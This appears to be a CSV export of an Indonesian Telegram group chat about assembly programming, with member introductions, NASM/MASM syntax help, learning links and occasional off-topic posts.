+853,0,"Ada yg pernah coding mikrokontroller MCS51, AVR atau PIC di sini?",15,8,2019,5,32,56,Aswad,,0,aswadsun
+854,853,"aku, minus pic hehehe",15,8,2019,5,34,0,Suka,Isnaini,0,kenzanin
+855,0,Pake assembly nya or C?,15,8,2019,6,3,58,Aswad,,0,aswadsun
+856,0,PIC sebenarnya assembly-nya paling cepat bisa dipelajari karena cuma 30an instruction set hehe,15,8,2019,6,4,32,Aswad,,0,aswadsun
+857,0,"Kalo yg lebih lama lagi  8080, 8085, 6502 atau Z80, ada yg punya pengalaman?",15,8,2019,6,5,44,Aswad,,0,aswadsun
+858,855,mixed C dan asm,15,8,2019,6,17,15,Suka,Isnaini,0,kenzanin
+859,857,z80 asm hehehe,15,8,2019,6,18,29,Suka,Isnaini,0,kenzanin
+860,0,,15,8,2019,6,27,6,Yuri,Mahendra,0,YuriMahendra
+861,0,"Wah, z80 pake untuk apa? tahun brp tuh hehe...",15,8,2019,6,27,22,Aswad,,0,aswadsun
+862,0,"salken semua, saya dari tegal, seorang mahasiswa",15,8,2019,6,27,53,Yuri,Mahendra,0,YuriMahendra
+863,862,Halo Salken Kak,15,8,2019,6,35,58,$_ Alan,,0,AlGhuroba1996
+864,862,Hoh kepriwe?,15,8,2019,7,20,21,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+865,864,Aja kaya ngana laa..,15,8,2019,7,21,2,Maaf,Merepotkan... 🙏,0,cahgentoo
+866,865,Kaya kiye ora?,15,8,2019,7,21,20,Hadi Hidayat (Robi),Hammurabi,0,hadihammurabi
+867,861,jaman kuliah tahun 2004-5 hehe,15,8,2019,7,23,30,Suka,Isnaini,0,kenzanin
+868,0,,15,8,2019,17,47,20,ivy,,0,maiifurai
+869,0,,15,8,2019,23,13,29,El-Mufidah:,,0,Sendirian
+870,0,"selamat pagi gan, jangan lupa kerja sebelum makan.\nmaaf saya mau tanya, bagaimana cara belajar assembly...\nadakah referensi untuk belajar bagi pemula?\nterima kasih banyak atas jawabannya...\nmohon maaf kalo ada salah dalam pertanyaannya.",15,8,2019,23,16,27,El-Mufidah:,,0,Sendirian
+871,870,Pertanyaan bagus 👍🏽,15,8,2019,23,18,7,Maaf,Merepotkan... 🙏,0,cahgentoo
+872,870,Walapun namanya mengerikan 😰,15,8,2019,23,18,21,Maaf,Merepotkan... 🙏,0,cahgentoo
+873,0,"iya, maaf bang... ada referensikah?",15,8,2019,23,20,47,El-Mufidah:,,0,Sendirian
+874,873,Baca dokumentasinya,15,8,2019,23,46,8,詹,鉦華,0,jzh4n
+875,874,dokumentasi?,15,8,2019,23,46,48,El-Mufidah:,,0,Sendirian
+876,875,Ya,15,8,2019,23,46,55,詹,鉦華,0,jzh4n
+877,306,"owh, makasih min",15,8,2019,23,47,11,El-Mufidah:,,0,Sendirian
+878,0,"tapi yang, bahasa indonesia ada nggak ya?",15,8,2019,23,47,52,El-Mufidah:,,0,Sendirian
+879,875,"Kayak NASM, ya baca dokumentasinya https://www.nasm.us/docs.php",15,8,2019,23,48,18,詹,鉦華,0,jzh4n
+880,0,Assembly banyak macam soalnya,15,8,2019,23,48,53,詹,鉦華,0,jzh4n
+881,0,"wah pusing juga ya bang, belajar assembly ini",15,8,2019,23,50,44,El-Mufidah:,,0,Sendirian
+882,0,"Menurut pengalaman pribadi saya, akan lebih mudah jika mengerti dulu arsitektur yang kita pilih, karena assembly itu erat kaitannya dengan perangkat akumulator, register dsb, yang ada di arsitektur tersebut. Jadi yang perlu ditanyakan di awal adalah, arsitektur apa? Apakah intel x86, ini yang paling umum.",16,8,2019,1,15,54,Aswad,,0,aswadsun
+883,0,"Lebih baik belajar bahasa C dulu. Pahami apa itu pointer, stack, heap dan alokasi memory baru ke asm.",16,8,2019,1,46,38,詹,鉦華,0,jzh4n
+884,0,`external *fungsi dalam C*` itu instruksi bukan?,16,8,2019,2,6,20,ZakiNadhif,,0,zndf0
+885,0,"Jadi pas itu, sya ngecompile sc trus ada\n```nasm:parser: instruction expected```",16,8,2019,2,7,40,ZakiNadhif,,0,zndf0
+886,0,"Pagi kawan2 Assemblyy Programming, perkenalkan saya Hilmy Izzulhaq dari arsa.tech .\n\nDisini apakah ada yg pengalaman ngoprek SoC RISC-V & program menggunakan Asm.\n\ndisini kami mengembangkan SoC sendiri menggunakan arsitektur RISC-V sebagai produk baru kami, saat ini masih menggunakan Fpga (Artix7), kedepan ada rencana untuk ke silicon.\n\nKalau ada yg pernah ngoprek mungkin dari kami juga mau minta bantuan 😁",17,8,2019,3,40,36,Hilmy Izzulhaq,| ARSA Technology,0,hilmy_izzulhaq
+887,0,Aku taunya cuma mainan rars aja 🙈,17,8,2019,4,8,45,Moriah,Soewako,0,soewako
+888,886,"Btw, ini targetnya mau jadi MCU apa sampai prosesor ""besar""? 👀",17,8,2019,4,10,47,Moriah,Soewako,0,soewako
+889,888,"Sekarang yg udah jadi masih MCU mas, cuman task2 kecil kayak GPIO, USART, dll. nah ini sedang dibuatin yg bisa running debian",17,8,2019,5,46,34,Hilmy Izzulhaq,| ARSA Technology,0,hilmy_izzulhaq
+890,889,,17,8,2019,8,3,16,Moriah,Soewako,0,soewako
+891,0,Nice,17,8,2019,8,3,24,Moriah,Soewako,0,soewako
+892,0,Macam lowrisc gitu ya jadinya?,17,8,2019,8,3,38,Moriah,Soewako,0,soewako
+893,0,Inb4 memang ngerjain lowrisc 👀,17,8,2019,8,8,30,Moriah,Soewako,0,soewako
+894,886,"saya dulu skripsi bikin custom assembler, mungkin bisa bantu",17,8,2019,9,35,22,F,,0,fdedraco
+895,886,mantrap hehe. goodluck,17,8,2019,15,13,43,Suka,Isnaini,0,kenzanin
+896,892,yak kurang lebih begitu mas,17,8,2019,15,14,43,Hilmy Izzulhaq,| ARSA Technology,0,hilmy_izzulhaq
+897,896,,17,8,2019,18,36,7,Moriah,Soewako,0,soewako
+898,0,Kulgram desain CPU dong om sekali-kali~,17,8,2019,18,36,22,Moriah,Soewako,0,soewako
+899,0,,20,8,2019,0,37,26,Samsurya,(19.01.013.075),0,Mrd34th
+900,0,,20,8,2019,1,44,30,Nicko,Chandra Kurniawan,0,nickochandrak
+901,0,"Halo aku nicko, saya tinggal di sragen.",20,8,2019,1,44,44,Nicko,Chandra Kurniawan,0,nickochandrak
+902,0,hallo,20,8,2019,14,19,42,Suka,Isnaini,0,kenzanin
+903,901,"Welcome, saya dari Sragen juga, tapi udah nggak tinggal di sana.",20,8,2019,15,4,37,Ammar Faizi,,0,ammarfaizi2
+904,0,,20,8,2019,23,10,28,Muhammad,Ilyas,0,Ilyassstri
+905,903,Iya.,21,8,2019,11,55,11,Nicko,Chandra Kurniawan,0,nickochandrak
+906,0,Syntax Instruksi Out apa ya?,22,8,2019,2,51,45,ZakiNadhif,,0,zndf0
+907,0,,22,8,2019,9,40,59,widya huang,,0,Widyahuanggg
+908,0,"1. Full stack engineer (Project Manager)\n- experience in nodejs, mongodb, AWS\n- experience in Vue.js framework\n- experience in Flutter for IOS and Android development\n\n2. Backend Engineers\n- experience in nodejs, mongodb, AWS\n\n3. Frontend Engineers (Vue.js)\n- experience in Vue.js framework\n\n4. Mobile Engineers (Flutter)\n- experience in flutter for both android and IOS development\n\n5. UI/UX Designer (Freelance is ok!)\n- have existing portfolio to showcase\n- experience with creating original designs like menu, tab and widgets\n- identify and troubleshoot UX problem\n\n1. NO Freelance/Offsite engagements, \n2. Candidate must be living in / relocate to Batam! \n3. Experience in working with Singapore companies is preferred :)\n4. Fluency in English is preferred too!",22,8,2019,10,52,17,widya huang,,0,Widyahuanggg
+910,0,,22,8,2019,20,1,4,Didik,,0,adidiks
+911,0,,23,8,2019,13,18,3,Samuel,Bernard,0,SamuelBernard
+912,0,,27,8,2019,8,31,2,Maman S,,0,mamans86
+913,0,,27,8,2019,9,37,50,Akbar,,0,AkbarAshShoghir
+914,0,,28,8,2019,1,10,26,Feldy,Maulana,0,feldymaulana
+915,0,,29,8,2019,15,17,43,KtrxLab,,0,ktruxLab
+916,0,,1,9,2019,5,22,26,,,0,
+917,0,,1,9,2019,11,19,57,Изар,,0,gofferi
+918,0,,2,9,2019,7,30,29,-,,0,consoleaa
+919,0,,2,9,2019,15,38,26,,,0,
+920,0,,2,9,2019,20,8,7,Lazuardy,Khatulistiwa,0,lazuardyk
+921,0,,3,9,2019,13,41,36,,,0,
+922,0,,6,9,2019,7,53,0,,,0,
+923,0,,9,9,2019,18,15,27,,,0,
+924,0,https://www.nayuki.io/page/a-fundamental-introduction-to-x86-assembly-programming,10,9,2019,2,40,46,Birowo,,0,b1r0w0
+925,0,,10,9,2019,12,36,42,,,0,
+926,0,,11,9,2019,2,52,34,Eka,Ramdhani,0,Ekahungkul
+927,0,Pengibaran Bendera Setengah Tiang dan Hari Berkabung Nasional,11,9,2019,12,52,5,hadi,wijaya,0,Xn1nj4
+928,927,Koq application ?\n\nSaya tidak berani buka.,11,9,2019,15,17,44,Maaf,Merepotkan... 🙏,0,cahgentoo
+929,927,Cross group spam?,12,9,2019,1,13,1,Ammar Faizi,,0,ammarfaizi2
+930,928,hanya file pdf,12,9,2019,1,14,42,Sea Gate,,0,
+931,928,https://en.wikipedia.org/wiki/Media_type#Common_examples,12,9,2019,1,31,42,Moriah,Soewako,0,soewako
+932,930,"Di HP, tulisannya aplikasi",12,9,2019,2,18,55,Maaf,Merepotkan... 🙏,0,cahgentoo
+933,0,Saya salah. Maaf.,12,9,2019,2,19,0,Maaf,Merepotkan... 🙏,0,cahgentoo
+934,0,,12,9,2019,2,35,16,Sea Gate,,0,
+935,0,numpang nyengir maang  wkkwkw,12,9,2019,2,35,35,Sea Gate,,0,
+936,932,yups. sama pak disini tulisan nya application hehee,12,9,2019,3,17,25,Suka,Isnaini,0,kenzanin
+937,0,"CTF nih, hadiahnya gede\nwreck-it.id",13,9,2019,2,22,11,Ircham,,0,ircham_aji
+938,0,,13,9,2019,2,41,7,,,0,
+939,0,,13,9,2019,12,46,31,Abdul,Hamid,0,katuang
+940,0,,13,9,2019,14,14,21,Didik,Hadumi,0,dhs0223
+941,0,Salken,13,9,2019,14,14,32,Didik,Hadumi,0,dhs0223
+942,0,,14,9,2019,2,51,11,Fitrah,Muhammad,0,fitrh
+943,0,,14,9,2019,19,3,2,koceng belang,,0,Arbaym
+945,0,,15,9,2019,12,10,17,∞[····–––···––··––],NF,0,Kakatuahitam
+946,0,,15,9,2019,16,12,15,Muhammad Hanafi,Ibsan,0,hanafiibsan
+949,0,,17,9,2019,1,36,43,Angga,,0,lakbanbening
+950,0,,17,9,2019,20,30,42,Marda,Firmansyah,0,mardafirmansyah
+951,0,,17,9,2019,21,34,37,Adinda Hyeongje,,0,bbkidspowder
+952,0,,18,9,2019,1,4,7,Dani,Gunawan,0,dani_gunawan
+954,0,,18,9,2019,13,10,4,Supriati,Elsago,0,SupriatiElsago2410
+955,0,"Assalamualaikum...\nKak ikut gabung...\nSalam knl dari saya..\nSupriati , nganjuk jatim",18,9,2019,13,17,40,Supriati,Elsago,0,SupriatiElsago2410
+956,0,,18,9,2019,13,18,22,Supriati,Elsago,0,SupriatiElsago2410
+958,0,,18,9,2019,22,21,26,,,0,
+959,0,,18,9,2019,23,45,49,,,0,
+960,0,Kak saya iku gabung.🙋\nSalam kenal.. Izza dari nganjuk,19,9,2019,12,54,12,,,0,
+961,0,,23,9,2019,8,1,20,Guntur,Mtr,0,GM_FP
+962,0,Hallo semua salam kenal,23,9,2019,8,4,14,Guntur,Mtr,0,GM_FP
+963,0,👍,23,9,2019,8,4,31,,,0,
+964,0,👋,23,9,2019,8,4,48,Guntur,Mtr,0,GM_FP
+966,0,,23,9,2019,13,53,24,Sunil,,0,aryasan_me
+967,0,,24,9,2019,6,46,33,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+968,0,"Selamat Pagi, mungkin saya lupa, perkenalkan diri eik haritz, bisa dipanggil ""haritz aryandra"".. salam kenal dari nub 😁",25,9,2019,2,47,49,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+970,0,salam..,25,9,2019,4,6,37,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+972,0,,25,9,2019,4,14,12,Ach.,"Chanifulloh, S.Kom. M.Pd.",6285333573336,Chanifulloh
+974,0,https://www.robertxiao.ca/hacking/dsctf-2019-cpu-adventure-unknown-cpu-reversing/,25,9,2019,6,32,7,Moriah,Soewako,0,soewako
+975,0,https://safiire.github.io/blog/2017/08/19/solving-danish-defense-intelligence-puzzle/,25,9,2019,6,34,53,Moriah,Soewako,0,soewako
+976,0,Nemu beginian nih 👀,25,9,2019,6,35,4,Moriah,Soewako,0,soewako
+977,975,Asik nih buat dicoba,25,9,2019,7,2,24,koceng belang,,0,Arbaym
+978,306,http://www.koth.org/pmars/ game seru,25,9,2019,7,13,34,Didik,Hadumi,0,dhs0223
+979,0,,25,9,2019,14,2,9,Rody,,0,h4child
+980,0,"Ok added, thanks.",25,9,2019,14,9,27,Ammar Faizi,,0,ammarfaizi2
+981,971,"Belum tau, belum ada waktu.",25,9,2019,14,10,53,Ammar Faizi,,0,ammarfaizi2
+982,0,,26,9,2019,4,1,26,ㅤ,,0,xGeheim
+983,0,,26,9,2019,4,21,42,RET𝐍𝐇𝐎,,0,retnoslayer
+985,984,"Dear kawan2,\nApa kabaaar 😜...\n\nSetelah sekian lama, saya perbarui juga daftar ini 🙈. Dan masih secara berkala kusebar.\n\nPemula linux dapat memulai dengan mengikuti group (paguyuban): @GNULinuxIndonesia.\n\nBagi pengguna GNU/Linux, kalau sudah lebih dari setahun pakai distro, bisa mulai kepo simak distro lain:\n\n🍔 @FedoraID\n🍔 @centosID\n🍔 @openSUSE_ID\n\n🌮 @manjaroID\n🌮 @ArchLinuxID\n🌮 @CodernateLinuxID\n\n🌭 @BlankOnLinux\n🌭 @DebianID\n🌭 @ubuntu_id\n🌭 @mint_id\n🌭 @elementaryID\n🌭 @proxmoxid\n\n🥙 @tealinux\n🥙 @endlessos_id\n🥙 @deepin_indonesia\n\n🍤 @GPG_Indonesia\n🍤 @SlackwareID\n\n🍤 @lfsid\n🍤 @dracoslinuxid\n🍤 @ibislinux\n\ncatatan 🥖: mohon maaf kalau ada yang belum dimasukkan 🎃.\ncatatan 🥓: namun ada yang sengaja tidak dimasukkan ✋🏽🤡🤚🏽.\n\nBagi yang suka hacking, lebih baik masuk ke group khusus misalnya:@Metasploitid, @reversingid, @kriptografiid, @Kriptografi, @ForensicaID, @ScrapeID, atau @bashidorg. Supaya tidak terjebak group yang dipenuhi pertanyaan mendasar dari n00b.\n\nPerlu dibikin: 📌 Void Indonesia.\nInvalid Link: SolusID.\n\nKustomisasi:\n\n🍓 @dotfiles_id\n\nText Editor:\n\n🍓 @VimID\n🍓 @emacsID\n\nAplikasi:\n\n🥁 @gimpscape\n🥁 @inkscapedia\n🥁 @Blender3DIndonesia\n🥁 @inkscapefontforge\n🥁 @LibreOfficeID\n🥁 @BelajarLibreOfficeIndonesia.\n\nAplikasi Backend:\n\n🥁 @zimbraID\n\nGroup (paguyuban) umum:\n\n🍓 @RemasterGNULinuxIndonesia\n🍓 @GNULinuxIndonesia\n🍓 @unixlikeindonesia\n\nNon Linux:\n\n🥐 @freebsdid\n🥐 @setanmerahID\n🕷 @pegelbsd\n\nGroup Baru:\n\n🕷 @nixosid\n🕷 @linuxclearID\n🐾 @centos_id\n🐾 @XentaOS\n🐾 @oss_id\n\nSelain distro coba juga environment-nya:\n\n🍩 @gnomeid\n🍪 @kdeid\n\nSekian 🎸.",27,9,2019,2,11,15,Maaf,Merepotkan... 🙏,0,cahgentoo
+986,0,language indonesia?,27,9,2019,2,32,53,Rody,,0,h4child
+987,0,ada yg bisa jelasin singkat untuk web assembly? sama dengan assembly intel x86 kah?,27,9,2019,7,19,45,Suka,Isnaini,0,kenzanin
+988,987,"https://www.petanikode.com/apa-itu-webassembly/ , berbeda dengan assembly x86",27,9,2019,7,24,14,koceng belang,,0,Arbaym
+989,988,thanks,27,9,2019,7,25,51,Suka,Isnaini,0,kenzanin
+990,988,oooo bikin opcode sendiri ternyata heheh. thanks pak.,27,9,2019,7,27,23,Suka,Isnaini,0,kenzanin
+991,0,"kedepan kelas assembly mungkin diisi sama ginian untuk yg jurusan it, klo jurusan electronic masih assembly bawaan cpu? hehe",27,9,2019,7,28,17,Suka,Isnaini,0,kenzanin
+992,991,Dulu aku mikirnya web assembly itu assembly x86 dipake untuk buat website,27,9,2019,7,29,27,koceng belang,,0,Arbaym
+993,992,nah itu yg aku bayangin. terus kepikiran untuk pengguna arm apa dibuatin emulator lagi hehehe,27,9,2019,7,31,33,Suka,Isnaini,0,kenzanin
+994,993,Yang riscv dibuatin emulatornya juga hahaha,27,9,2019,7,34,56,koceng belang,,0,Arbaym
+995,0,Bagus juga bener2 masukin native kedalam browser,27,9,2019,7,35,42,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+996,0,Artinya bisa eksekusi devices tanpa JavaScript lg,27,9,2019,7,36,14,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+997,996,Niatnya kan begitu pak,27,9,2019,7,40,32,koceng belang,,0,Arbaym
+998,0,Yes,27,9,2019,7,40,51,Haritz - حريتز اسماعيل بريانتو م,@7y@nd7@(F0G_678),0,haritz_aryandra
+999,0,,28,9,2019,23,0,19,LinAndr,,0,Teleg3_7
+1000,0,,29,9,2019,5,23,6,梦洁,,0,bgardentee
+1001,0,,29,9,2019,14,9,10,Visual,Lost,0,yologangs
+1002,0,,29,9,2019,18,33,40,Prabhat,Kumar,0,aerosol_can
+1003,0,where to code/practice x86 assembly?,29,9,2019,19,46,12,Prabhat,Kumar,0,aerosol_can
+1004,0,can't figure out what's wrong :(,29,9,2019,20,36,43,Prabhat,Kumar,0,aerosol_can
+1005,1004,Could you show me the code?,29,9,2019,20,37,21,Ammar Faizi,,0,ammarfaizi2
+1006,1003,The pinned message has some references to it.,29,9,2019,20,37,50,Ammar Faizi,,0,ammarfaizi2
+1007,0,"``` .368\n.model flat\n.code\nstart  PROC\n      mov  eax,213\n        add eax,432\n\n      ret\nstart  endp\nend     start```",29,9,2019,20,39,2,Prabhat,Kumar,0,aerosol_can
+1008,1007,I don't think that is a valid NASM syntax.,29,9,2019,20,40,14,Ammar Faizi,,0,ammarfaizi2
+1009,0,"Firstly, the warning notices you that you need to put colon after label name.",29,9,2019,20,40,42,Ammar Faizi,,0,ammarfaizi2
+1010,0,section .section_name\n\n_start:\n   // your code goes here ...,29,9,2019,20,41,26,Ammar Faizi,,0,ammarfaizi2
+1011,0,What is the purpose of this?\n\n```start  endp\nend     start```,29,9,2019,20,41,53,Ammar Faizi,,0,ammarfaizi2
+1012,0,A sub routine must only be defined once.,29,9,2019,20,42,9,Ammar Faizi,,0,ammarfaizi2
+1013,0,"i downloaded a udemy course, it was using MASM in VIsual Studio",29,9,2019,20,42,44,Prabhat,Kumar,0,aerosol_can
+1014,1004,"But, you use NASM instead (?)",29,9,2019,20,43,6,Ammar Faizi,,0,ammarfaizi2
+1015,0,"but when i tried to do it, it gave an error",29,9,2019,20,43,11,Prabhat,Kumar,0,aerosol_can
+1016,1014,"yep, i asked a friend, he told me to make an obj with nasm and then compile it with gcc",29,9,2019,20,44,13,Prabhat,Kumar,0,aerosol_can
+1017,1016,"Tbh, I have not used Microsoft assembler like MASM, so I can't explain the correct syntax for it. But frankly, NASM is different with MASM. You may had to use MASM compiler.",29,9,2019,20,46,39,Ammar Faizi,,0,ammarfaizi2
+1018,0,Go on with this one https://www.microsoft.com/en-us/download/details.aspx?id=12654,29,9,2019,20,47,3,Ammar Faizi,,0,ammarfaizi2
+1019,0,"i did download MASM and tried to install it, but i said it required some version off visuall C++ 2005\nthat was a real pain, and ultimately nothing worked",29,9,2019,20,49,13,Prabhat,Kumar,0,aerosol_can
+1020,1019,It is normal that some applications require depencencies. You have to fulfill the compulsory requirements first. If it said requires visual C++ then try to install it visual C++.,29,9,2019,20,51,54,Ammar Faizi,,0,ammarfaizi2
+1021,0,that's the problem\nthe help page led me to 7 different .exe \ni tried them all\nall gave the same error,29,9,2019,20,53,36,Prabhat,Kumar,0,aerosol_can
+1022,0,,29,9,2019,20,55,23,Prabhat,Kumar,0,aerosol_can
+1023,1021,"I am sorry to hear that, I can't give more suggestion related to the Windows software requirements. But anyway, your valuable time might be saved if you use Linux, or maybe a VM with Linux to run and learn NASM. With NASM you may also get more helpful responses from community (this group included).",29,9,2019,20,55,44,Ammar Faizi,,0,ammarfaizi2
+1024,0,guess that's the only option left,29,9,2019,20,56,23,Prabhat,Kumar,0,aerosol_can
+1025,0,is there some book for NASM?,29,9,2019,20,56,50,Prabhat,Kumar,0,aerosol_can
+1026,306,"There are some here, check it up.",29,9,2019,20,57,26,Ammar Faizi,,0,ammarfaizi2
+1027,0,and a silly question\nthe NASM on Linux and the one on Windows are the same right?,29,9,2019,20,58,30,Prabhat,Kumar,0,aerosol_can
+1028,1027,I haven't touched any assembler on Windows. But I think the NASM on any OS are having the same purpose.,29,9,2019,20,59,32,Ammar Faizi,,0,ammarfaizi2
+1029,0,,30,9,2019,23,39,35,Host,Xyz,0,HostXyz
+1030,0,,1,10,2019,6,55,47,,,0,
+1031,0,"Siang kak, Tolong komentarnya dong kak berkaitan design saya  makasih https://dribbble.com/shots/7283748-Design-Ui-Simple-Note?utm_source=Clipboard_Shot&utm_campaign=sumendrakadek108&utm_content=Design%20Ui%20Simple%20Note&utm_medium=Social_Share",1,10,2019,6,58,42,,,0,
+1035,0,,2,10,2019,13,16,35,Dadan,Suhamdani,0,ddhanz
+1036,0,,2,10,2019,15,36,16,Ayu,Nur,0,Ayyayu
+1037,0,,2,10,2019,23,0,38,Mekel,Ilyasa,0,mekelilyasa
+1039,0,,3,10,2019,18,11,44,Muhamad Hidayatulloh,,0,dayat_trad
+1040,0,,4,10,2019,20,7,10,Benny,Idris sinaga,0,Naga_idris
+1041,0,,5,10,2019,18,18,6,DAUD,Hargan,0,DaudHargan
+1042,0,,8,10,2019,3,27,26,Andre,,0,anta40
+1043,0,"salam kenal semuanya. saya Andre, kerja sebagai mobile app dev sejak 2010. dari SMA udah pengen belajar assembly gara2 baca buku virus komputer tapi ampe sekarang pun belum kelar2 ehehe",8,10,2019,4,4,55,Andre,,0,anta40
+1044,0,Hi\nI'm needed to learn assembly lang\nI was asking friends for a road map,8,10,2019,9,31,40,,,0,
+1048,0,,9,10,2019,23,27,41,wang,lj,0,wanglj
+1054,1053,Git repo,10,10,2019,5,36,54,Maaf,Merepotkan... 🙏,0,cahgentoo
+1055,1050,gotoxy ... baunya jaman seniornya abang saya pakai borland,10,10,2019,5,53,25,Maaf,Merepotkan... 🙏,0,cahgentoo
+1057,1056,Hmmm...\n\nAI/BD/ML/DS mah hubungannya dengan matematika dan statistik.\n\nGak ada urusannya tuh dengan microcontroller.,10,10,2019,6,6,49,Maaf,Merepotkan... 🙏,0,cahgentoo
+1058,1057,Mungkin microcontrollernya dipasang system pakar om hehehe,10,10,2019,6,10,53,koceng belang,,0,Arbaym
+1059,1058,Real Mode ... hehe ...,10,10,2019,6,21,44,Maaf,Merepotkan... 🙏,0,cahgentoo
+1060,1049,ini ngebuild-nya pakai apa ya? NASM sepertinya?,10,10,2019,7,58,42,Andre,,0,anta40
+1061,1060,Diliat dari sorce codenya sih itu nasm,10,10,2019,7,59,28,koceng belang,,0,Arbaym
+1062,0,,10,10,2019,10,14,47,orang ya,,0,h00manraikan
+1063,1049,"eniwei, ini kok kayak emu8086 yak? dulu pernah pake sih. hmmm...",10,10,2019,15,35,15,Andre,,0,anta40
+1066,0,"kalau mas memang kompeten di OS, bisa mahal banget. salah satu eks kantor saya pernah beli source code OS sekitar 1M. Smart card OS ya, bukan buat PC :)",10,10,2019,16,12,28,Andre,,0,anta40
+1069,0,"semoga berhasil mas. Linus dulu di awal bikin Linus juga buat hobi. katanya ""won't be big and professional like gnu""",10,10,2019,16,23,30,Andre,,0,anta40
+1072,0,"asm programming sudah niche sekali sih mas, bahkan mau bikin OS pun udah gak harus 100% asm lagi :)",10,10,2019,16,29,53,Andre,,0,anta40
+1075,0,boleh tahu mas Ari ini masih kuliah/SMA/SMP atau sudah kerja?,10,10,2019,16,36,48,Andre,,0,anta40
+1078,0,banyak2 baca referensi/buku desain OS mas. zaman sekarang rata2 orang yg bikin OS itu itu scopenya untuk riset sendiri. anggap aja latihan programming.,10,10,2019,16,42,11,Andre,,0,anta40
+1079,0,kecuali kalo niatnya mau jadi kompetitor OS yg udah well established kayak windows/linux... nah ini bukan perkara gampang sih :),10,10,2019,16,43,27,Andre,,0,anta40
+1082,0,kerjaan saya sih mobile & web. assembly itu wah udah terlalu jauh gak relevan disini hehe,10,10,2019,16,50,39,Andre,,0,anta40
+1084,0,🤔,10,10,2019,16,53,10,Kamal,Arief,0,Kamalarief
+1089,0,saya dulu di kelas compiler gak pake asm betulan sih. cuma asm fiktif mirip2 SPIM gitu,10,10,2019,16,56,53,Andre,,0,anta40
+1094,0,"Mau bertanya, terkait malware. Packer malware itu apa ya? Dan fungsi kriptografi pada packer malware untuk apa ya?",11,10,2019,13,18,27,Fly,,0,kuipr
+1095,0,packer itu aplikasi utk mengompress ukuran executable. gunanya antara lain supaya malware lebih susah di-reverse engineer,11,10,2019,17,27,44,Andre,,0,anta40
+1096,1056,"Wah, jago nih. 👍 Pernah mbuat solusi managed traffic light?",11,10,2019,22,46,18,Andy,Prasetya,0,andyprasetya
+1097,0,,12,10,2019,11,55,24,Kresna Bayu,R,0,Kbayureynaldi
+1098,0,Cara mempermudah buat program itu gimana ya?,13,10,2019,9,49,9,ZakiNadhif,,0,zndf0
+1099,0,Terutama dalam membuat program dari asm,13,10,2019,9,49,35,ZakiNadhif,,0,zndf0
+1100,0,Kaya graph atau semacamnya,13,10,2019,9,50,7,ZakiNadhif,,0,zndf0
+1101,0,Ada yang tau caranya supaya desain program efektif gk?,13,10,2019,9,50,25,ZakiNadhif,,0,zndf0
+1102,0,graph? graph apa ini yg dimaksud? teori graph kah: https://en.wikipedia.org/wiki/Graph_theory ?,13,10,2019,9,59,26,Andre,,0,anta40
+1103,0,Bukan,13,10,2019,10,8,29,ZakiNadhif,,0,zndf0
+1104,0,kaya flowchart mungkin,13,10,2019,10,9,36,ZakiNadhif,,0,zndf0
+1105,0,UML juga,13,10,2019,10,9,41,ZakiNadhif,,0,zndf0
+1106,0,Atau gmana,13,10,2019,10,9,46,ZakiNadhif,,0,zndf0
+1107,0,Graph atau chart2 yang membantu dalam mendesain program apa aja ya?,13,10,2019,10,13,14,ZakiNadhif,,0,zndf0
+1108,0,"flowchart/UML itu rasanya cuma dipakai di kelas rekayasa perangkat lunak di kuliah. atau mungkin kerjaannya software architect ya, bukan developer? cmiiw hehe",13,10,2019,10,22,56,Andre,,0,anta40
+1109,1107,"ya UML. Kalau pakai software Visual Paradigm, bisa manfaatkan instant code generator nya. Tapi ini cuman sampai high level domain class, dan (CMIIW) hanya C++. Untuk ke code yang ""sebenarnya"" masih butuh sentuhan manual banyak sekali. Apalagi ke ASM.",13,10,2019,10,24,58,Andy,Prasetya,0,andyprasetya
+1110,0,,14,10,2019,0,51,56,Ahmad,,0,
+1111,0,,14,10,2019,1,29,55,Daniel,Putera Alamsyah,0,dputeraa
+1112,1108,"Hmm kalo mau ngedesign sebelum buat program aslinya pake apa?, apa ada yang lain graphnya atau gimana?, pokoknya selain pseudocode",14,10,2019,9,46,59,ZakiNadhif,,0,zndf0
+1113,1109,Ooh,14,10,2019,9,48,49,ZakiNadhif,,0,zndf0
+1114,0,Makasih yak,14,10,2019,9,48,55,ZakiNadhif,,0,zndf0
+1115,1112,saya sih gak pake tools macem2. paling coret2 di kertas/whiteboard hehe,14,10,2019,10,3,16,Andre,,0,anta40
+1116,0,"Ooh, sama dong hehe",14,10,2019,10,6,37,ZakiNadhif,,0,zndf0
+1117,0,@andyprasetya tapi programnya berbayar yak,14,10,2019,10,9,8,ZakiNadhif,,0,zndf0
+1118,1108,Analyst,14,10,2019,10,33,7,∞[····–––···––··––],NF,0,Kakatuahitam
+1119,1117,iya lah. 😬,14,10,2019,12,3,40,Andy,Prasetya,0,andyprasetya
+1120,1108,+ mahasiswa yg sedang kebingungan mbuat sekripsi.,14,10,2019,12,8,8,Andy,Prasetya,0,andyprasetya
+1121,0,,15,10,2019,6,36,13,,,0,
+1125,0,,15,10,2019,9,48,37,Ammar Faizi,,0,ammarfaizi2
+1126,0,,15,10,2019,11,38,51,,,0,
+1127,0,,16,10,2019,14,28,45,Yanto,蔣,0,Yanto_chiang
+1128,0,Ka maaf mau tanya kalo skrip bikin cv aoa aja aya?,17,10,2019,0,3,16,Muhammad,Ilyas,0,Ilyassstri
+1129,0,Apa,17,10,2019,0,3,19,Muhammad,Ilyas,0,Ilyassstri
+1130,1128,saya biasanya pakai LaTeX. misal: https://jblevins.org/projects/cv-template/,17,10,2019,3,6,12,Andre,,0,anta40
+1131,0,aoa itu bukan nya age of age?,17,10,2019,3,25,43,Suka,Isnaini,0,kenzanin
+1132,0,,17,10,2019,15,31,12,K,,0,knr_08
+1133,0,,19,10,2019,15,31,38,M.,Prasodjo,0,aralmelintang
+1134,0,,19,10,2019,16,41,46,YoKo,,0,yokokho
+1136,0,,20,10,2019,1,41,24,Aradyka,,0,Ignazioaradyka
+1137,0,,20,10,2019,1,50,29,Cak,Dzikri,0,
+1138,0,,20,10,2019,3,27,51,IO,Ring,0,NtCreateIoRing
+1139,0,,20,10,2019,4,39,28,,,0,
